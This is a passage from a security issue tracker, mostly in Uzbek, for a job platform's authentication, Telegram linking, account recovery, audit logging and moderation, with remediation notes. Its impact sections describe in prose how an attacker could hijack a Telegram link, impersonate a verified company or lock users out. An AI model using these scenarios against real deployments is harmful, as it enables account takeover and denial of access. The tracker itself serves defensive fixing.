- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-153

**Telefon va Telegram identifikatsiya modeli E/F/G qoidalariga zid: raqam unikal emas, Telegram jimgina ko'chadi, bog'lashda tasdiq yo'q**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** auth/phone-identity
- **Fayl:** `apps/api/src/modules/telegram/telegram.service.ts:340`
- **Root cause:** phone oddiy ixtiyoriy maydon: tasdiqlash uni takroriylikni tekshirmasdan qayta yozadi, additionalPhone esa erkin matn. Telegram 'unikalligi' chatni boshqa hisobdan jimgina uzib, yangisiga ko'chirish orqali ta'minlanadi. Deep-link bosilishi bilan bog'lash amalga oshadi: bot qaysi hisobga bog'layotganini ko'rsatmaydi va tasdiq so'ramaydi. ISSUE-010 tavsiya qilgan link-token tasdig'i bajarilmagan.
- **Impact:** Bitta raqam bir necha hisobda tasdiqlangan bo'lishi mumkin, shu sabab telefon orqali tiklash (B) noaniq yoki egallanadigan bo'ladi. Hujumchi o'z hisobi uchun olgan /api/telegram/link havolasini jabrlanuvchiga yuborsa, jabrlanuvchining Telegram'i hujumchi hisobiga o'tadi va o'z hisobidan ogohlantirishsiz uziladi. Kontakt ulashilsa, jabrlanuvchi raqami hujumchi hisobida tasdiqlanadi. Telegram uzilganda telefon tasdiqlangan holicha qoladi. Bularning hech biri audit qilinmaydi.
- **Evidence:** schema.prisma:163 `phone String?` (unique yo'q), :217 additionalPhone. telegram.service.ts:262-273 link-token -> `updateMany({ telegramChatId: chatId, id: { not: userId } } -> null)`, keyin tasdiqsiz bog'lash; :339-343 `data: { phone, isPhoneVerified: true }`, takror tekshiruvi yo'q. telegram.routes.ts:39-45 unlink faqat telegramChatId=null. profile.routes.ts:65-66 tasdiqlanmagan phone erkin yoziladi, :74 additionalPhone tasdiqsiz. ISSUES.md:366 ISSUE-010 link-token varianti (fix faqat login'ga qo'llangan). DB_MAP.md:139.
- **Recommended fix:** Faqat Telegram orqali tasdiqlangan, normallashtirilgan raqamlarni saqlang. Unikallikni alohida VerifiedPhone kolleksiyasi yoki unique indeks bilan ta'minlang (MongoDB'da null qiymatlarda unique cheklov muammosiga e'tibor bering). Zaxira raqamni ham Telegram orqali tasdiqlang. Boshqa hisobga bog'langan Telegram identifikatsiyasini ko'chirmang, rad eting. Bog'lashda botda maskalangan email bilan Tasdiqlash/Rad etish tugmasini ko'rsating. Unlink yoki raqam o'zgarganda tasdiqni tozalang, sessiya siyosatini qo'llang va audit hodisasini yozing. Avval mavjud takroriy raqamlarni aniqlab hal qiling, demo seed'ni va DB_MAP/API_MAP'ni yangilang.
- **Severity izohi:** P1 saqlandi. Link-token fishing detali kodda tekshirilib qo'shildi. Tiklash hali yo'qligi uchun P0 emas, lekin B oqimi shu model ustiga qurilsa hisobni egallashga olib keladi.
- **Manba topilmalar:** docs-4
- **Bajarilgan fix:** docs-4: FIXED — Wave 1: User.backupPhone/backupTelegramId/phoneVerifiedAt + indekslar, telefon va Telegram yagonaligi kodda majburiy (auth-telegram-check 49/49)
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-154

**Qo'lda tiklash (H qoidasi) yo'q: so'rov modeli, admin tekshiruvi va xavfsiz telefon almashtirish amali mavjud emas**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** auth/manual-recovery
- **Fayl:** `apps/api/src/modules/admin/admin.routes.ts:190`
- **Root cause:** ISSUE-012 adminlar yordam bera olmasligini qayd etgan, lekin qo'lda tiklash jarayoni loyihalanmagan. Admin API'da foydalanuvchi bo'yicha faqat ro'yxat, bloklash va rolni o'zgartirish bor. Tiklash so'rovi modeli ham, egalikni tekshirish mezonlari ham yo'q.
- **Impact:** Paroli, telefoni va Telegram'i yo'q foydalanuvchi uchun hech qanday yo'l yo'q, holbuki FAQ yordam berishni va'da qiladi. Support egalikni tekshirib, telefonni xavfsiz almashtira olmaydi. Bu sessiyani bekor qilmaydigan va audit izi qoldirmaydigan qo'lda DB tahririga yo'l ochadi.
- **Evidence:** admin.routes.ts:136-217: foydalanuvchi endpointlari faqat list, `PATCH /api/admin/users/:id/block` (:190) va `/role` (:217). apps/api/src va prisma'da recovery modeli yoki route'i yo'q (grep). ISSUES.md:406 «support qo'lda hech narsa qila olmaydi (admin panelida ham parol o'rnatish yo'q)». messages.uz.ts:469 «biz bilan bog'laning — hisobingizni tiklashga yordam beramiz». /contact formasi faqat admin Telegram chatiga uzatadi (DESIGN.md:189).
- **Recommended fix:** RecoveryRequest modelini (status, arizachining aloqa ma'lumoti, reviewerId, izohlar, createdAt) va rate-limit'li ochiq so'rov formasini qo'shing. Admin panelda so'rovni ko'rib chiqish va 'tasdiqlangan telefonni qayta o'rnatish' amalini yarating: u telefon va Telegram bog'lanishini tozalaydi, tokenVersion'ni oshiradi, 'manual recovery approved' va 'sessions invalidated' audit hodisalarini yozadi, parolni esa ko'rsatmaydi va o'rnatmaydi. Keyin foydalanuvchi yangi telefonni Telegram orqali tasdiqlaydi va B oqimi orqali parol o'rnatadi. Egalikni tekshirish mezonlarini qaror sifatida hujjatlashtiring va FAQ'ni moslang.
- **Severity izohi:** P1 saqlandi: H qoidasi talab qilgan jarayon umuman yo'q. ISSUE-012 faqat o'z-o'zini tiklashni rejalashtirgan, shuning uchun yangi.
- **Manba topilmalar:** docs-7
- **Bajarilgan fix:** docs-7: FIXED — Wave 1: RecoveryRequest modeli + /api/auth/recovery/manual* va admin tasdiq/rad endpointlari
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-155

**Xavfsizlik audit jurnali yo'q: L qoidasidagi hodisalar hech qayerga yozilmaydi**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** security/audit-log
- **Fayl:** `apps/api/prisma/schema.prisma:160`
- **Root cause:** Audit jurnali hech qachon doiraga kiritilmagan. Sxemada hodisa modeli yo'q, identifikatsiya, telefon yoki sessiyani o'zgartiradigan kod hech qanday hodisa yozmaydi. Qaysi hodisalar yozilishi va qaysi maydonlar hech qachon yozilmasligi hujjatlarda belgilanmagan.
- **Impact:** Telefon tasdiqlash, Telegram bog'lash/uzish, sessiyalarni bekor qilish, bloklash/rol o'zgarishi, kelajakdagi tiklash va qo'lda tiklash tasdiqlarini tekshirib ham, tergov qilib ham bo'lmaydi. H qoidasi aynan shu jurnalga tayanadi.
- **Evidence:** apps/api/src, prisma va apps/web/src bo'ylab `auditlog|securityevent|security_event` grep hech narsa topmadi. Hodisasiz o'zgarishlar: telegram.service.ts:269-273 (Telegram ko'chirish/bog'lash), :340-343 (telefon tasdiqlandi), telegram.routes.ts:39-45 (uzish), auth.service.ts:166-173 revokeUserSessions, admin.routes.ts:190-224 (block/role). ARCHITECTURE_AUDIT, DECISIONS va FINAL_AUDIT audit jurnalini tilga olmaydi.
- **Recommended fix:** SecurityEvent modelini qo'shing: userId, actorId, L qoidasidagi turlar enum'i, ip/userAgent xulosasi, redaksiya qilingan metadata, createdAt; indeks [userId, createdAt]. Hodisalarni phone verified, backup phone added, phone changed, recovery started/completed, sessions invalidated, manual recovery approved, Telegram linked/unlinked, shuningdek block, role va staff invite nuqtalarida yozing. Parol, access/refresh token, bot token, xom tiklash tokeni va xabar matni metadata'ga tushmasligini bitta yordamchi funksiya orqali majburlang. Hodisalar ro'yxati va taqiqlangan maydonlarni qaror va ARCHITECTURE_AUDIT'da hujjatlashtiring, admin uchun faqat o'qiladigan ko'rinish qo'shing.
- **Severity izohi:** P1 saqlandi: L qoidasining talabi va H qoidasining sharti.
- **Manba topilmalar:** docs-6
- **Bajarilgan fix:** docs-6: FIXED — Wave 1: SecurityEvent modeli va recordSecurityEvent; admin/team/auth oqimlarida hodisalar yoziladi
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-156

**Hujjatlar Telegram botni ixtiyoriy deydi, lekin telefon tasdiqlash va asosiy amallar unga bog'liq; K qoidasi hujjatlanmagan**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** docs/deploy
- **Fayl:** `README.md:132`
- **Root cause:** 'Ixtiyoriy xizmatlar' jadvali requirePhoneVerified gate'lari va Telegram'ga bog'liq tiklash qoidalaridan oldin yozilgan va yangilanmagan. env validatsiyasi ham production'da TELEGRAM_BOT_TOKEN'ni talab qilmaydi (sukut: bo'sh satr).
- **Impact:** TELEGRAM_BOT_TOKEN'siz production deploy'da /api/telegram/link 503 qaytaradi va hech kim telefon tasdiqlay olmaydi. Natijada ariza yuborish, vakansiya joylash yoki qayta faollashtirish, chat boshlash va sharh yozish ishlamaydi, kelajakdagi B tiklash ham imkonsiz bo'ladi. Deploy checklist buni ushlamaydi, bot o'chiq bo'lganda UI nima deyishi (K) esa hech qayerda yozilmagan.
- **Evidence:** README.md:132-137 «Loyiha ularsiz ham to'liq ishlaydi»; Telegram qatorida faqat kirish, tasdiqlash va xabarnomalar o'chiq bo'lishi aytilgan. .env.example:4-5,61-62. DEPLOY.md:55-64 minimal o'zgaruvchilar va :202-210 checklist'da Telegram yo'q. env.ts:57 `TELEGRAM_BOT_TOKEN: z.string().optional().default('')`. Gate'lar: applications.routes.ts:43, vacancies.routes.ts:156,249, chat.routes.ts:294, reviews.routes.ts:19. telegram.routes.ts:25-32 `503 BOT_OFFLINE`.
- **Recommended fix:** DEPLOY.md va .env.example'da TELEGRAM_BOT_TOKEN'ni (support uchun TELEGRAM_ADMIN_CHAT_ID'ni ham) production uchun majburiy deb belgilang; production'da token bo'sh bo'lsa env.ts ogohlantirsin yoki xato bersin. README jadvalini qayta yozing: bot yo'q yoki o'chiq bo'lsa tasdiqlash va tiklash vaqtincha ishlamaydi va gate qilingan amallar bloklanadi. Checklist'ga bot orqali telefon tasdiqlash qadamini qo'shing. K qoidasidagi UI xatti-harakatini (BOT_OFFLINE -> 'tasdiqlash vaqtincha mavjud emas', email fallback yo'q) hujjatlashtiring va web'da tekshiring.
- **Severity izohi:** P1 saqlandi: hujjatga amal qilgan operator asosiy oqimlari ishlamaydigan production oladi.
- **Manba topilmalar:** docs-3
- **Bajarilgan fix:** docs-3: FIXED — README no longer calls the bot optional: a dedicated required row plus the Rule K behaviour, and DEPLOY/.env.example match.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-157

**Telegram hali ham login kanali: API, bot tasdiq oqimi, login tugmasi va 3 tildagi FAQ matnlari (qoida A)**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** auth/product-rule-A
- **Fayl:** `apps/api/src/modules/auth/auth.routes.ts:137`
- **Root cause:** ISSUE-010 fix'i Telegram orqali kirishni olib tashlamagan, faqat bot tasdiq tugmasi bilan mustahkamlagan. Lug'atlar ham eski auth modeli uchun yozilgan: Telegram login provayder, o'z-o'zini tiklash yo'q.
- **Impact:** A qoidasi buziladi: bog'langan Telegram to'liq sessiya ochadi. Telegram tiklash qurilsa, bitta identifikator ham login, ham tiklash omili bo'lib qoladi. uz/ru/en FAQ parolni unutganda 'Telegram orqali kiring' deydi.
- **Evidence:** auth.routes.ts:137 POST /api/auth/telegram/start, :149 /poll -> telegramLogin (auth.service.ts:176); telegram.service.ts:131 loginTokens, :177 «Telegram orqali kirish»; SocialLogin.tsx:145-154 Telegram tugmasi; messages.uz.ts:363-365 withTelegram/tgWaiting/tgNotLinked; uz:469 FAQ 'kirish sahifasida «Telegram» orqali kirishingiz mumkin' (ru:467, en:458-459 xuddi shunday).
- **Recommended fix:** /api/auth/telegram/start va /poll, telegramLogin, loginTokens, handleLoginStart va lg* callback'larni olib tashlang. SocialLogin'dagi Telegram tugmasini va login.tg* kalitlarini uz/ru/en'dan o'chiring. FAQ 'parol' javobi va passwordHint'ni yangi Telegram tiklash oqimiga moslab qayta yozing.
- **Severity izohi:** P1: egasining A qoidasi buzilgan. ISSUE-010 phishing sifatida FIXED qilingan; qolgan mavjudligi yangi mahsulot qoidasiga zid, shuning uchun yangi ildiz sabab.
- **Manba topilmalar:** candidate-flows-1, i18n-1
- **Bajarilgan fix:** candidate-flows-1: FIXED — Bot confirm flow and API removed; the /start text now explicitly says the bot is not a login channel. | i18n-1: FIXED — login.withTelegram/tgWaiting/tgNotLinked/tgExpired removed from types + uz/ru/en; a typed recovery.* section (phone, open-bot, expiry, unavailable, new password, manual request, su
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-158

**Kompaniya tasdig'i bitta boolean: nom, sayt yoki logo o'zgarsa ham 'tasdiqlangan' belgisi qoladi; dalil va so'rov oqimi yo'q**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** trust/company-verification
- **Fayl:** `apps/api/src/modules/companies/companies.routes.ts:108`
- **Root cause:** isVerified admin tekshirgan identifikatorga bog'lanmagan: tasdiqlangan nom va STIR snapshot'i yo'q, PUT va logo yuklash isVerified'ga tegmaydi. PUT sxemasida legalName/STIR yo'q. Ish beruvchida tasdiq so'rovi holati yo'q, unverify'da xabar yuborilmaydi.
- **Impact:** Kichik haqiqiy firma sifatida tasdiqlangan ish beruvchi kompaniyani mashhur brend nomiga o'zgartirib, brend logosini yuklaydi. Belgi kompaniya sahifasi, vakansiya kartalari va verified=1 filtrida qoladi va soxta vakansiyalar nomzod ma'lumotlarini yig'adi. Admin esa faqat nomga qarab tasdiqlaydi.
- **Evidence:** companies.routes.ts:108-119 update data (name, description, website...) isVerified'siz; :39-47 updateCompanySchema'da legalName/stir yo'q (POST :30-37 da bor, web chaqirmaydi); logo upload (146-166) belgini tiklamaydi; admin.routes.ts:374 verify faqat boolean'ni o'zgartiradi, xabar faqat verify'da.
- **Recommended fix:** Tasdiqlangan kompaniya nomi, sayti yoki logosi o'zgarsa isVerified=false qiling (egasiga xabar, admin navbatiga) yoki o'zgarishni tasdiqlanguncha pending saqlang. Tasdiqlangan nom va STIR snapshot'ini saqlang. PUT yoki alohida so'rov endpointi legalName/STIR qabul qilsin va admin ularni ko'rsin. Unverify sabab bilan xabar qilinsin, verify/unverify audit qilinsin.
- **Severity izohi:** P1 employer-flows-2 (impersonatsiya) asosida. employer-flows-18 (P3, dalil va so'rov oqimi yo'q) shu boolean-model ildiziga birlashtirildi.
- **Manba topilmalar:** employer-flows-2, employer-flows-18
- **Bajarilgan fix:** employer-flows-2: FIXED — Same D-073 implementation; logo upload and logo delete are covered as well as name/website. Only a meaningful difference resets the badge (trim, protocol and trailing-slash insensi | employer-flows-18: PARTIAL — The 'unverify notice' half is now implemented for automatic resets (owner gets a notification with a reason). Not implemented: legalName/STIR capture in PUT (the web form does not 
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-159

**Tasdiqlangan telefon unikal emas va unlink/relink'dan keyin eski hisobda qoladi: bitta raqam bir nechta hisobni tasdiqlaydi**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** data-integrity/product-rule-E-F
- **Fayl:** `apps/api/src/modules/telegram/telegram.service.ts:339`
- **Root cause:** Telefon tasdig'i User'dagi oddiy boolean, unikal claim yo'q. Telegram uzilganda yoki boshqa hisobga o'tganda eski hisobdagi phone va isPhoneVerified tozalanmaydi.
- **Impact:** E (unikal asosiy telefon) va F (bitta Telegram — bitta hisob) qoidalari bajarilmaydi. Bitta raqam bilan ko'p nomzod yoki spam hisob tasdiqlanadi va soxta arizaga qarshi gate foydasiz bo'ladi. Telefon orqali tiklashda qaysi hisob tiklanishi noaniq qoladi.
- **Evidence:** telegram.service.ts:339-342 phone boshqa foydalanuvchida bor-yo'qligi tekshirilmay yoziladi; schema.prisma:163 `phone String?` indekssiz (@unique faqat email:162 da); telegram.routes.ts:39-44 DELETE faqat telegramChatId'ni null qiladi; relink (telegram.service.ts:269-272) eski hisobning phone va isPhoneVerified'iga tegmaydi.
- **Recommended fix:** Normallashtirilgan telefon uchun unikal kalitli alohida claim kolleksiyasi yarating: Mongo'da null'lar sababli User.phone'ga oddiy unique indeks ishlamaydi. Raqam boshqa hisobda band bo'lsa tasdiqni rad eting va qo'lda tiklashga yo'naltiring. Unlink siyosatini belgilang: claim qoladimi yoki tasdiq audit bilan olinadimi. Mavjud dublikatlarni oldindan tekshiring.
- **Severity izohi:** P1: E/F qoidalari va anti-spam gate buzilgan. Enforcement'dan oldin mavjud dublikat raqamlarni ko'rib chiqish kerak.
- **Manba topilmalar:** candidate-flows-4
- **Bajarilgan fix:** candidate-flows-4: FIXED — Same uniqueness rule covers unlink/relink.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-160

**Asosiy telefonni almashtirish va zaxira telefon oqimi yo'q; additionalPhone tasdiqsiz erkin matn (qoidalar F, G)**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** candidate-profile/product-rule-F-G
- **Fayl:** `apps/api/src/modules/profile/profile.routes.ts:65`
- **Root cause:** Profil API telefonni faqat tasdiqlanmagan foydalanuvchiga yozadi va tasdiqni hech narsa qayta boshlamaydi. Zaxira raqam oddiy profil satri.
- **Impact:** Raqamini almashtirgan foydalanuvchi tasdiqlangan asosiy telefonni yangilay olmaydi (G). Tiklash uchun tasdiqlangan, unikal zaxira telefon yo'q (F). Yagona amaliy yo'l nazoratsiz: boshqa Telegram bog'lab kontakt ulashish telefonni audit va sessiya siyosatisiz almashtiradi.
- **Evidence:** profile.routes.ts:65 `if (body.phone !== undefined && !current?.isPhoneVerified)`; PersonalInfo.tsx:167-175 tasdiqlangan telefon qulflangan, almashtirish amali yo'q; additionalPhone erkin matn: profile.routes.ts:74, schema.prisma:217, PersonalInfo.tsx:191-203; telegram.service.ts:339-342 har kontakt ulashishda phone ustidan yoziladi.
- **Recommended fix:** Yangi sahifasiz /profile?tab=telegram panelida 'Asosiy telefonni almashtirish' va 'Zaxira telefon qo'shish' amallarini qo'shing. Har biri bir martalik Telegram challenge boshlasin va faqat bog'langan identifikatordan kontakt kelganda faollashsin. Unikallikni tekshiring, phone_changed/backup_phone_added audit yozing, risk talab qilsa tokenVersion++. additionalPhone'ni 'faqat aloqa' deb belgilang yoki tasdiqlangan zaxiraga migratsiya qiling.
- **Severity izohi:** P1: F/G qoidalari amalga oshirilmagan. Apply gate bilan umumiy tasdiq modeliga tegadi (o'rta risk).
- **Manba topilmalar:** candidate-flows-5
- **Bajarilgan fix:** candidate-flows-5: FIXED — Phone change and backup phone flows exist, both password-confirmed and Telegram-verified. JobSeekerProfile.additionalPhone is untouched (different purpose).
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-161

**Qo'lda tiklash (qoida H) imkonsiz: faqat Telegramga uzatiladigan aloqa formasi, saqlanadigan so'rov ham, admin amali ham yo'q**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** auth/manual-recovery
- **Fayl:** `apps/api/src/modules/support/support.routes.ts:121`
- **Root cause:** Hisobni tiklash modellashtirilmagan. Support xabari faqat admin Telegram chatiga yuboriladi va hech qayerda saqlanmaydi. Admin panelida egalikni tekshirish va telefonni tiklash vositasi yo'q.
- **Impact:** Parol, telefon va Telegramni yo'qotgan foydalanuvchi admin ishlay oladigan so'rov qoldira olmaydi. Bot yoki admin chat sozlanmagan yoki ishlamasa, so'rov umuman yuborilmaydi (503/502), bu K qoidasiga ham zid. Admin tasdiqlangan telefonni tiklash, sessiyalarni majburan bekor qilish va audit qilish imkoniga ega emas.
- **Evidence:** support.routes.ts:19-29 mavzularda hisobni tiklash yo'q; :128-129 503 SUPPORT_OFFLINE; :140 faqat sendTelegramMessage(env.TELEGRAM_ADMIN_CHAT_ID...), bazaga yozilmaydi; :142-143 502; admin.routes.ts'da faqat block (revokeUserSessions) va role amallari; messages.uz.ts:469 FAQ /contact'ga yuboradi.
- **Recommended fix:** 'account_recovery' mavzusini qo'shing: u Telegramdan mustaqil ravishda RecoveryRequest yozuvini saqlasin (status, aloqa email, dalil matni, IP hash). Mavjud /admin/users ichida ro'yxat va tasdiqlash amali bo'lsin. Tasdiqlash telefon claim'i va Telegram bog'lanishini tozalasin, tokenVersion++ qilsin, audit yozsin. Admin parol va tokenni ko'rmasin, parol o'rnata olmasin.
- **Severity izohi:** P1: H qoidasi amalga oshirilmagan. ISSUE-012 (self-service tiklash) bilan bog'liq, lekin alohida admin oqimi.
- **Manba topilmalar:** candidate-flows-6
- **Bajarilgan fix:** candidate-flows-6: FIXED — Requests are persisted with a one-time code (sha256 at rest); the response is identical whether or not the email exists.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-162

**Xavfsizlik audit log'i yo'q: telefon tasdig'i, Telegram bog'lash/uzish va sessiyalarni bekor qilish qayd etilmaydi (qoida L)**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** security/audit-log
- **Fayl:** `apps/api/prisma/schema.prisma:160`
- **Root cause:** Audit yoki xavfsizlik hodisasi modeli ham, uni yozuvchi kod ham yo'q. Xavfsizlikka oid holat o'zgarishlari oddiy Prisma update.
- **Impact:** L qoidasi buzilgan. Phishing orqali bog'lash, telefonning jimgina almashishi va sessiyalarni bekor qilishni tekshirib ham, foydalanuvchiga ko'rsatib ham bo'lmaydi. Qo'lda tiklashdan iz qolmaydi.
- **Evidence:** schema.prisma modellari (User:160 ... PushSubscription:794) orasida audit/security/recovery modeli yo'q. Telefon tasdig'i telegram.service.ts:340-342, bog'lash :269-273, uzish telegram.routes.ts:39-44, sessiyalarni bekor qilish (logout, admin block/role) — hech biri qayd etilmaydi.
- **Recommended fix:** SecurityEvent kolleksiyasi yarating: {userId, type, actorUserId, createdAt, ipHash, meta}, indeks [userId, createdAt]. phone_verified, backup_phone_added, phone_changed, telegram_linked/unlinked, recovery_started/completed, sessions_invalidated va manual_recovery_approved hodisalarida yozing. Parol, token, bot token va xabar matni hech qachon yozilmasin.
- **Severity izohi:** P1: L qoidasi. O'zgarish additiv, xavfi past.
- **Manba topilmalar:** candidate-flows-7
- **Bajarilgan fix:** candidate-flows-7: FIXED — phone_verified, telegram_linked/unlinked and sessions_invalidated are recorded.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-163

**Admin 'arxivlash' bilan olib tashlagan vakansiyani ish beruvchi bir bosishda qayta faollashtiradi (moderatsiyani chetlab o'tish)**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** moderation/vacancy-lifecycle
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.routes.ts:240`
- **Root cause:** PATCH /status admin bo'lmagan foydalanuvchiga archived yoki draft'dan active'ga o'tishga ruxsat beradi. Admin moderatsiyasi va foydalanuvchini bloklash ham xuddi shu oddiy 'archived' holatini yozadi; kim va nima uchun arxivlagani saqlanmaydi.
- **Impact:** Admin faol vakansiyani Archive tugmasi bilan olib tashlaydi, ish beruvchi Activate bilan qaytaradi. Faqat telefon, kategoriya va joylashuv qayta tekshiriladi, admin xabar olmaydi. 'Moderatsiyani chetlab o'tib bo'lmasin' qoidasi buziladi.
- **Evidence:** vacancies.routes.ts:240 `allowedFrom = { active: ["archived", "draft"], archived: ["active"] }`; :244-253 faqat telefon va placement; admin.routes.ts:289 moderate enum'da archived, :301-309 moderatsiya belgisi yozilmaydi; admin/vacancies/+Page.tsx:185-186 faol qatorda Archive; web adapter.ts:101 archived uchun activate; e2e'da bu holat yo'q.
- **Recommended fix:** Moderatsiya kelib chiqishini saqlang (masalan moderatedBy/moderatedAt yoki alohida moderationState), yoki admin olib tashlashni 'rejected' orqali qiling va /moderate'dan archived'ni olib tashlang. PATCH /status admin arxivlagan vakansiyani admin bo'lmaganga faollashtirishni 409 bilan rad etsin. Admin amallarini audit qiling va e2e test qo'shing.
- **Severity izohi:** P1: aniq mahsulot qoidasi (moderatsiyani chetlab o'tish imkonsiz bo'lishi kerak). ISSUE-024 holat mashinasi rejected/moderation holatlarini qamragan, admin arxivlash yo'lini emas.
- **Manba topilmalar:** employer-flows-1
- **Bajarilgan fix:** employer-flows-1: FIXED — Same lock. Legacy rows (adminArchivedAt absent) keep working exactly as before, as D-070 requires.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-164

**Telegram hali ham login kanali: /api/auth/telegram/start va /poll parolsiz sessiya beradi**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** auth/telegram-login
- **Fayl:** `apps/api/src/modules/auth/auth.routes.ts:137`
- **Root cause:** Telegram uchinchi kirish usuli sifatida qurilgan. /poll consumeLoginToken dan keyin telegramLogin(userId) chaqiradi, u parol, rol yoki login-guard tekshiruvisiz access va refresh token beradi. Login sahifasida Telegram tugmasi bor (showTelegram sukut true), FAQ esa parolni unutganlarga Telegram orqali kirishni tavsiya qiladi.
- **Impact:** A qoidasi buziladi. Bog'langan Telegram chatini egallagan kishi (admin va xodimlar ham) parolsiz 30 kunlik sessiya oladi. 15 daqiqalik access token bilan o'z Telegramini ulagan hujumchi logout-all va blokdan keyin ham doimiy parolsiz kirishni saqlab qoladi.
- **Evidence:** auth.routes.ts:137-158; auth.service.ts:176-181 telegramLogin faqat assertNotBlocked; telegram.service.ts:12, 131-190, 248-250, 310-315; SocialLogin.tsx:31, 90-116, 145-154; messages.uz.ts:363, 469; messages.en.ts:463; messages.ru.ts:471; README.md:92, 137.
- **Recommended fix:** /api/auth/telegram/start va /poll, telegramLogin, loginTokens, handleLoginStart va lgok/lgno callbacklarini olib tashlang. Webdan startTelegramLogin/pollTelegramLogin, Telegram tugmasi va tg*/withTelegram matnlarini (3 til) o'chiring, FAQ va README'ni yangilang. Telegram tiklash oqimi (B qoidasi) bilan bir relizda chiqaring. O'chirilgan route'lar 404 qaytarishini e2e bilan tekshiring.
- **Severity izohi:** P1 (4 manba bir xil). Yangi A qoidasi bo'yicha: ISSUE-010 faqat tasdiq tugmasini qo'shgan (FIXED), ISSUE-122/D-039 test yo'qligi haqida. Endi muammo oqim xavfsizligi emas, oqimning mavjudligi.
- **Manba topilmalar:** auth-core-1, telegram-1, authz-idor-1, admin-staff-4
- **Bajarilgan fix:** auth-core-1: FIXED — API side of Rule A done; the login button/FAQ live in apps/web (web-auth-ui, already removed there - no /api/auth/telegram references remain in apps/web/src). | telegram-1: FIXED — POST /api/auth/telegram/start and /poll removed, telegramLogin() deleted, bot lg tokens and lgok/lgno callbacks gone; the bot can no longer mint a session. | authz-idor-1: FIXED — Same removal; callback queries are now answered generically and grant nothing. | admin-staff-4: FIXED — No passwordless session path remains, so staff/admin sessions can only come from email+password (Google is additionally blocked for staff/admin, D-055).
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-165

**Email bo'yicha login lockout: istalgan kishi qurbonni cheksiz bloklab qo'ya oladi (I qoidasi)**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** auth/brute-force
- **Fayl:** `apps/api/src/common/login-guard.ts:27`
- **Root cause:** assertLoginAllowed parol tekshiruvidan oldin ishlaydi. Qat'iy 15 daqiqalik oynada email uchun 10 xatodan keyin IP'dan qat'i nazar va to'g'ri parolda ham 429 qaytaradi. Hisoblagich faqat qurbon emaili bo'yicha, xotirada va 50k chegarada eng eskisini tashlaydi.
- **Impact:** Har 15 daqiqada 10 ta noto'g'ri urinish (IP limitidan ancha past) istalgan ma'lum email, jumladan admin yoki employer, egasini doimiy tashqarida qoldiradi. Tiklash oqimi yo'q, shuning uchun chiqish yo'li ham yo'q. Bu I qoidasi taqiqlagan oson account-denial modeli. Aksincha, soxta XFF bilan 50k soxta email yuborib qurbon hisoblagichini siqib chiqarish ham mumkin (taxmin).
- **Evidence:** login-guard.ts:12-14, 27-36, 45-50; auth.service.ts:93 assertLoginAllowed argon2.verify'dan oldin, :97, :103 recordLoginFailure; D-007 Risk: 'lockout DoS — MENING QARORIM KERAK'.
- **Recommended fix:** Qattiq blokni egasini to'smaydigan throttling bilan almashtiring: (email, IP yoki /24) kaliti; email bo'yicha global chegara 15 daqiqalik blok emas, 30-60 soniyagacha backoff yoki N xatodan keyin challenge. Oldin muvaffaqiyatli kirgan qurilma (imzolangan cookie) istisno. Hisoblagichni Mongo'da TTL bilan saqlang va chegara oshganda security event yozing. TRUST_PROXY fix'i bilan birga qiling, e2e kutilmasini yangilang.
